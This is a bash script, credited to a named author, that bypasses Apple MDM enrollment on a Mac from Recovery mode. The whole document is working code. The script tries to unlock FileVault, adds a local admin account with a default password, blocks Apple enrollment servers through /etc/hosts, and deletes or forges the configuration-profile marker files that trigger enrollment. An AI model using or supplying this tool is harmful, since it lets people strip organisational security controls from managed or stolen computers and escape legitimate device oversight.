#!/bin/bash

RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
PUR='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

echo -e "${CYAN}Bypass MDM By Assaf Dori (assafdori.com)${NC}"
echo ""

# ─── Volume helpers ───────────────────────────────────────────────

mount_data_volume() {
  for vol in "/Volumes/Macintosh HD - Data" "/Volumes/Macintosh HD" "/Volumes/Data"; do
    [ -d "$vol" ] && { echo "$vol"; return 0; }
  done
  local maybe
  maybe=$(diskutil apfs list 2>/dev/null | grep -iE "Data" | grep -v "Free" | head -1 | awk '{print $NF}')
  [ -n "$maybe" ] && [ -d "/Volumes/$maybe" ] && { echo "/Volumes/$maybe"; return 0; }
  echo ""
  return 1
}

mount_system_volume() {
  for vol in "/Volumes/Macintosh HD" "/Volumes/Macintosh HD - Data" "/Volumes/Data"; do
    if [ -d "$vol" ] && [ -f "$vol/System/Library/CoreServices/SystemVersion.plist" ]; then
      echo "$vol"; return 0
    fi
  done
  for vol in /Volumes/*; do
    if [ -d "$vol" ] && [ -f "$vol/System/Library/CoreServices/SystemVersion.plist" ]; then
      echo "$vol"; return 0
    fi
  done
  echo ""
  return 1
}

# ─── FileVault detection ─────────────────────────────────────────

detect_filevault() {
  local sysvol
  sysvol=$(mount_system_volume)
  [ -z "$sysvol" ] && return 1
  if [ -f "$sysvol/private/var/db/FileVault/FileVaultMaster.keychain" ] || \
     diskutil apfs list 2>/dev/null | grep -i "FileVault" | grep -qi "Yes"; then
    return 0
  fi
  return 1
}

unlock_filevault() {
  local attempt=1
  local max_attempts=3
  local datavol
  datavol=$(mount_data_volume)
  [ -n "$datavol" ] && return 0
  local uuid
  uuid=$(diskutil apfs list 2>/dev/null | grep -B5 "Volume.*Data" | grep "UUID" | head -1 | awk '{print $NF}')
  [ -z "$uuid" ] && uuid=$(diskutil apfs list 2>/dev/null | grep -A2 "Data" | grep "UUID" | head -1 | awk '{print $NF}')
  while [ $attempt -le $max_attempts ]; do
    echo -e "${YEL}FileVault detected. Enter recovery key or volume password:${NC}"
    read -rs password
    echo ""
    if diskutil apfs unlockVolume "$uuid" -passphrase "$password" 2>/dev/null; then
      echo -e "${GRN}Volume unlocked.${NC}"
      return 0
    fi
    echo -e "${RED}Wrong passphrase. Attempt $attempt of $max_attempts.${NC}"
    attempt=$((attempt + 1))
  done
  echo -e "${RED}Failed to unlock after $max_attempts attempts.${NC}"
  return 1
}

PS3='Please enter your choice: '
options=("Bypass MDM from Recovery" "Disable Notification (SIP)" "Disable Notification (Recovery)" "Check MDM Enrollment" "Reboot & Exit")
select opt in "${options[@]}"; do
  case $opt in

    "Bypass MDM from Recovery")
      echo -e "${YEL}Bypass MDM from Recovery"

      # Detect and unlock FileVault
      if detect_filevault; then
        echo -e "${YEL}FileVault is enabled on this Mac.${NC}"
        unlock_filevault || {
          echo -e "${RED}Cannot proceed without unlocking the data volume.${NC}"
          echo -e "${YEL}Use password reset from Recovery Utilities first, then rerun.${NC}"
          break
        }
      fi

      # Rename data volume for consistency
      if [ -d "/Volumes/Macintosh HD - Data" ]; then
        diskutil rename "Macintosh HD - Data" "Data"
      fi

      echo -e "${NC}Create a Temporary User"
      read -p "Enter Temporary Fullname (Default is 'Apple'): " realName
      realName="${realName:=Apple}"
      read -p "Enter Temporary Username (Default is 'Apple'): " username
      username="${username:=Apple}"
      read -p "Enter Temporary Password (Default is '1234'): " passw
      passw="${passw:=1234}"

      dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default'
      echo -e "${GRN}Creating Temporary User"
      dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username"
      dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
      dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
      dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "501"
      dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"
      mkdir "/Volumes/Data/Users/$username"
      dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
      dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$passw"
      dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership $username

      echo "0.0.0.0 deviceenrollment.apple.com"  >>/Volumes/Macintosh\ HD/etc/hosts
      echo "0.0.0.0 mdmenrollment.apple.com"     >>/Volumes/Macintosh\ HD/etc/hosts
      echo "0.0.0.0 iprofiles.apple.com"         >>/Volumes/Macintosh\ HD/etc/hosts
      echo "0.0.0.0 albert.apple.com"            >>/Volumes/Macintosh\ HD/etc/hosts
      echo "0.0.0.0 gdmf.apple.com"              >>/Volumes/Macintosh\ HD/etc/hosts
      echo -e "${GRN}Blocked MDM & Profile Domains"

      touch /Volumes/Data/private/var/db/.AppleSetupDone
      rm -f /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
      rm -f /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
      touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
      touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound

      # Clean user-level MDM artifacts
      for user_home in /Volumes/Data/Users/*/; do
        [ -d "$user_home/Library" ] || continue
        rm -f "$user_home/Library/Preferences/com.apple.mdm.plist"       2>/dev/null || true
        rm -f "$user_home/Library/Preferences/com.apple.mdmclient.plist" 2>/dev/null || true
        rm -rf "$user_home/Library/Caches/com.apple.enrollmenttool"      2>/dev/null || true
      done

      echo -e "${GRN}MDM enrollment has been bypassed!${NC}"
      echo -e "${NC}Exit terminal and reboot your Mac.${NC}"
      break
      ;;

    "Disable Notification (SIP)")
      echo -e "${RED}Please Insert Your Password To Proceed${NC}"
      sudo rm /var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
      sudo rm /var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
      sudo touch /var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
      sudo touch /var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
      break
      ;;

    "Disable Notification (Recovery)")
      rm -f /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
      rm -f /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
      touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
      touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
      break
      ;;

    "Check MDM Enrollment")
      echo ""
      echo -e "${GRN}Check MDM Enrollment. Error is success${NC}"
      echo ""
      echo -e "${RED}Please Insert Your Password To Proceed${NC}"
      echo ""
      sudo profiles show -type enrollment
      break
      ;;

    "Reboot & Exit")
      echo "Rebooting..."
      reboot
      break
      ;;

    *) echo "Invalid option $REPLY" ;;
  esac
done
